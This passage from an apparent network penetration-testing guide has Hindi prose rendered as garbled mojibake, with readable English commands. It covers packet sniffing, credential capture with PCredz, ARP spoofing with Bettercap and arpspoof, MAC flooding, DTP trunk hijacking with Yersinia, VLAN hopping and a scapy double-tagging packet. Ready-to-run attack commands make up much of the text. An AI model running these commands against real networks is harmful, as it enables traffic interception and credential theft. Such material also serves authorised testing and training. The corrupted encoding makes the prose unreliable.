nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS рдФрд░ IPS рдмрдЪрд╛рд╡

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **рдЕрдзрд┐рдХ nmap рд╡рд┐рдХрд▓реНрдк**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### рдЖрдВрддрд░рд┐рдХ IP рдкрддреЛрдВ рдХрд╛ рдЦреБрд▓рд╛рд╕рд╛

**рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд░рд╛рдЙрдЯрд░, рдлрд╝рд╛рдпрд░рд╡реЙрд▓, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг** рдХрднреА-рдХрднреА **рдЧреИрд░-рдЬрдирддрд╛ рд╕реНрд░реЛрдд рдкрддреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЙрдмреНрд╕ рдХрд╛ рдЙрддреНрддрд░ рджреЗрддреЗ рд╣реИрдВред **tcpdump** рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд░реАрдХреНрд╖рдг рдХреЗ рджреМрд░рд╛рди рдирд┐рдЬреА рдкрддреЛрдВ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдкреИрдХреЗрдЯреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, Kali Linux рдкрд░, рдкреИрдХреЗрдЯреЛрдВ рдХреЛ **eth2 рдЗрдВрдЯрд░рдлреЗрд╕** рдкрд░ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рд╕реБрд▓рдн рд╣реИред рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреА рд╕реЗрдЯрдЕрдк NAT рдпрд╛ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЗ рдкреАрдЫреЗ рд╣реИ, рддреЛ рдРрд╕реЗ рдкреИрдХреЗрдЯреЛрдВ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
tcpdump тАУnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдк рдХреИрдкреНрдЪрд░ рдХрд┐рдП рдЧрдП рдлреНрд░реЗрдо рдФрд░ рдкреИрдХреЗрдЯ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдХреЗ IP рд░реЗрдВрдЬ, рд╕рдмрдиреЗрдЯ рдЖрдХрд╛рд░, MAC рдкрддреЗ рдФрд░ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЗ рд╡рд┐рд╡рд░рдг рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рд╕реНрд╡рд┐рдЪрд┐рдВрдЧ рдлреИрдмреНрд░рд┐рдХ рдкрд░ рддрдирд╛рд╡ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкрд╛рд╕рд┐рд╡ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд╝рд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдПрдХ рд╕реНрд╡рд┐рдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдИрдерд░рдиреЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреЗрд╡рд▓ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдлреНрд░реЗрдо рдФрд░ рдЖрдкрдХреЗ MAC рдкрддреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рд╛рдордЧреНрд░реА рджреЗрдЦреЗрдВрдЧреЗред

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
рдЖрдк рдХрд┐рд╕реА рджреВрд░рд╕реНрде рдорд╢реАрди рд╕реЗ SSH рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Wireshark рдХреЗ рд╕рд╛рде рд░реАрдпрд▓рдЯрд╛рдЗрдо рдореЗрдВ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗред

### Capturing credentials

рдЖрдк [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) рдЬреИрд╕реЗ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ pcap рдпрд╛ рд▓рд╛рдЗрд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## LAN attacks

### ARP spoofing

ARP Spoofing рдореЗрдВ рдЧреНрд░реИрдЯрд┐рдЯрд┐рдпрд╕ ARPResponses рднреЗрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдПрдХ рдорд╢реАрди рдХрд╛ IP рд╣рдорд╛рд░реЗ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ MAC рдХреЗ рдкрд╛рд╕ рд╣реИред рдлрд┐рд░, рд╢рд┐рдХрд╛рд░ ARP рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдмрджрд▓ рджреЗрдЧрд╛ рдФрд░ рд╣рд░ рдмрд╛рд░ рдЬрдм рд╡рд╣ рд╕реНрдкреВрдл рдХрд┐рдП рдЧрдП IP рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рд╣рдорд╛рд░реЗ рдорд╢реАрди рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдЧрд╛ред

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

рд╕реНрд╡рд┐рдЪ рдХреЗ CAM рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░реЗрдВ, рд╡рд┐рднрд┐рдиреНрди рд╕реНрд░реЛрдд рдореИрдХ рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкреИрдХреЗрдЯ рднреЗрдЬрдХрд░ред рдЬрдм CAM рддрд╛рд▓рд┐рдХрд╛ рднрд░ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреА рддрд░рд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИ (рд╕рднреА рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рдирд╛)ред
```bash
macof -i <interface>
```
In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** рдХреЛ рдПрдХ рд▓рд┐рдВрдХ рд▓реЗрдпрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рдЯреНрд░рдВрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреНрд░рдгрд╛рд▓реА рдХреЛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рд╕реЗ рд╕реНрд╡рд┐рдЪ рдЯреНрд░рдВрдХ рдореЛрдб (Trunk) рдпрд╛ рдиреЙрди-рдЯреНрд░рдВрдХ рдореЛрдб рдХреЗ рд▓рд┐рдП рдкреЛрд░реНрдЯ рдХрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЪрдпрди рдХрд░ рд╕рдХреЗрдВред **DTP** рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдЕрдХреНрд╕рд░ рдЙрдк-рдЗрд╖реНрдЯрддрдо рдиреЗрдЯрд╡рд░реНрдХ рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд╛ рд╕рдВрдХреЗрдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдХреЗрд╡рд▓ рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдЯреНрд░рдВрдХреНрд╕ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдФрд░ рдЙрдЪрд┐рдд рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рдорд╣рддреНрд╡ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рд╕реНрд╡рд┐рдЪ рдкреЛрд░реНрдЯ рдХреЛ рдбрд╛рдпрдиреЗрдорд┐рдХ рдСрдЯреЛ рдореЛрдб рдореЗрдВ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╡реЗ рдкрдбрд╝реЛрд╕реА рд╕реНрд╡рд┐рдЪ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓рдиреЗ рдкрд░ рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реИрдВред рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛ рддрдм рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ pentester рдпрд╛ рд╣рдорд▓рд╛рд╡рд░ рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдПрдХ DTP Desirable рдлреНрд░реЗрдо рднреЗрдЬрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреЛрд░реНрдЯ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХреНрд░рд┐рдпрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ STP рдлреНрд░реЗрдо рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ VLANs рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рд╕реЗрдЯрдЕрдк рдХрд░рдХреЗ VLAN рд╡рд┐рднрд╛рдЬрди рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

рдХрдИ рд╕реНрд╡рд┐рдЪреЛрдВ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ DTP рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХреЛ рдкреНрд░рддрд┐рдХреВрд▓ рдкрдХреНрд╖реЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рднреА VLANs рдХреЗ рдмреАрдЪ рдЯреНрд░реИрдлрд╝рд┐рдХ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИред рд╕реНрдХреНрд░рд┐рдкреНрдЯ [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕реНрд╡рд┐рдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ, рдЯреНрд░рдВрдХ, рдбрд╛рдпрдиреЗрдорд┐рдХ, рдСрдЯреЛ, рдпрд╛ рдПрдХреНрд╕реЗрд╕ рдореЛрдб рдореЗрдВ рд╣реИтАФрдЬрд┐рд╕рдореЗрдВ рд╕реЗ рдХреЗрд╡рд▓ рдПрдХреНрд╕реЗрд╕ рдореЛрдб VLAN рд╣реЙрдкрд┐рдВрдЧ рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рдкреНрд░рддрд┐рд░рдХреНрд╖рд┐рдд рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рд╕реНрд╡рд┐рдЪ рдХреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЖрдХрд▓рди рдХрд░рддрд╛ рд╣реИред

рдпрджрд┐ рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ _**Yersinia**_ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ DTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ "рдЯреНрд░рдВрдХрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ" рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рднреА VLANs рд╕реЗ рдкреИрдХреЗрдЯреЛрдВ рдХрд╛ рдЕрд╡рд▓реЛрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

VLANs рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, DTP Desirable рдлреНрд░реЗрдо рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдХрд┐рд╕реА рднреА рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдмрд╛рдзрд┐рдд рди рдХрд░реЗрдВред рдпрд╣ рд╣рд░ рддреАрди рд╕реЗрдХрдВрдб рдореЗрдВ DTP Desirable рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред **рд╕реНрд╡рд┐рдЪ рдкрд░ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЧрдП рдЯреНрд░рдВрдХ рдЪреИрдирд▓ рдХреЗрд╡рд▓ рдкрд╛рдВрдЪ рдорд┐рдирдЯ рддрдХ рдЬреАрд╡рд┐рдд рд░рд╣рддреЗ рд╣реИрдВред рдкрд╛рдВрдЪ рдорд┐рдирдЯ рдмрд╛рдж, рдЯреНрд░рдВрдХ рдЧрд┐рд░ рдЬрд╛рддрд╛ рд╣реИред**
```
sudo python3 DTPHijacking.py --interface eth0
```
рдореИрдВ рдпрд╣ рдмрддрд╛рдирд╛ рдЪрд╛рд╣реВрдВрдЧрд╛ рдХрд┐ **Access/Desirable (0x03)** рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ DTP рдлреНрд░реЗрдо Desirable рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣реИ, рдЬреЛ рдкреЛрд░реНрдЯ рдХреЛ Trunk рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИред рдФрд░ **802.1Q/802.1Q (0xa5)** **802.1Q** рдПрдирдХреИрдкреНрд╕реБрд▓реЗрд╢рди рдкреНрд░рдХрд╛рд░ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИред

STP рдлреНрд░реЗрдо рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ, **рд╣рдо VLAN 30 рдФрд░ VLAN 60 рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реАрдЦрддреЗ рд╣реИрдВред**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### рд╡рд┐рд╢рд┐рд╖реНрдЯ VLANs рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдирд╛

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк VLAN IDs рдФрд░ IPs рдорд╛рдиреЛрдВ рдХреЛ рдЬрд╛рди рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ VLAN рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**\
рдпрджрд┐ DHCP рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ рд╕реНрдерд┐рд░ IP рдкрддрд╛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП _ifconfig_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рд╣рдорд▓реЗ **Dynamic Trunking рдФрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдирд╛ рдФрд░ рдЕрдиреНрдп VLANs рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛** рдХреЛ рдЙрдкрдХрд░рдг рджреНрд╡рд╛рд░рд╛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рд╢рд┐рдХрд╛рд░ рд╣реЛрд╕реНрдЯ рдХрд╛ MAC, IP рдФрд░ VLAN ID** рдХрд╛ рдорд╛рди рдкрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **рдлреНрд░реЗрдо рдХреЛ рдбрдмрд▓ рдЯреИрдЧ** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЗрд╕рдХрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ VLAN рдФрд░ рд╢рд┐рдХрд╛рд░ рдХрд╛ VLAN рд╣реЛ рдФрд░ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ **рд╢рд┐рдХрд╛рд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд╛рде рд╡рд╛рдкрд╕ рдХрдиреЗрдХреНрдЯ рдирд╣реАрдВ рд╣реЛ рдкрд╛рдПрдЧрд╛**, рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╡рд┐рдХрд▓реНрдк UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рдирд╛ рд╣реИ** рдЙрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд▓рд┐рдП рдЬреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ SNMP)ред

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реИ **TCP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рд▓реЙрдиреНрдЪ рдХрд░рдирд╛, рдПрдХ IP рдХреЛ рд╕реНрдкреВрдл рдХрд░рдирд╛ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ рд╢рд┐рдХрд╛рд░ рджреНрд╡рд╛рд░рд╛ рд╕реБрд▓рдн рд╣реИ** (рд╕рдВрднрд╡рддрдГ рдЗрдВрдЯрд░рдиреЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ)ред рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯ рдореЗрдВ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдЙрд╕реЗ рд╢рд┐рдХрд╛рд░ рд╕реЗ рдХреБрдЫ рдкреИрдХреЗрдЯ рдорд┐рд▓рддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (190).png>)

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк scapy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдПрдХ рд╕реНрд╡рд┐рдЪ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЖрдк рд╕реАрдзреЗ рдЬреБрдбрд╝реЗ рд╣реБрдП рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ **VLAN рд╡рд┐рднрд╛рдЬрди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред рдмрд╕ **рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ** (рдЬрд┐рд╕реЗ рдЯреНрд░рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ), рд▓рдХреНрд╖рд┐рдд VLANs рдХреЗ IDs рдХреЗ рд╕рд╛рде 